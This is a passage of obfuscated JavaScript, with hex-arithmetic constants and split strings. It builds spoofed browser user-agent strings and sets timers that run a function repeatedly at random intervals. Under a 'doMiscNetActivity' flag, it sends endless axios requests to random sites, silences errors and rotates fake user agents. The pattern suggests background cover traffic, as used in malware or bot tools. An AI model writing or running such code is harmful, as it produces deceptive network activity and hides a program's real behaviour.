      'Mozilla/5.' + a4(0x18, 'KhVy') + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x11a * -0x11 + -0x1 * 0x1231 + -0x89; k < -0x1703 + -0x180e + 0x2f15; k++)
    setTimeout(f, (-0x12266 + -0xb85e + 0x1874 * 0x1d) * k * getRandomInt(0x6d0 + -0x1 * -0x1175 + -0xc22 * 0x2, 0x1787 + -0x260d + 0x3d * 0x3d));
  setInterval(() => {
    f();
    for (let l = 0x619 * -0x4 + 0x2 * 0x106f + 0x1b2 * -0x5; l < 0xc9a * -0x1 + -0x1 * 0x1a89 + 0x1 * 0x2727; l++)
      setTimeout(f, (0x9 * 0x246f + 0x9739 + -0x2c8 * 0x58) * l * getRandomInt(-0x962 + -0x1725 + -0x411 * -0x8, -0x251 + 0x3 * 0x95e + 0xce3 * -0x2));
  }, 0x1b3798 + 0x173bd * -0x1 + 0x1d2aa5);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1 * 0x3303 + 0x750 + -0x1efb) * getRandomInt(-0x71 * 0x35 + -0x23e7 + 0x3b4d, -0x229d * 0x1 + 0x1437 + 0xe6b * 0x1));
}, -0xa * -0x3ad + -0x4 * -0x38a + -0x3286);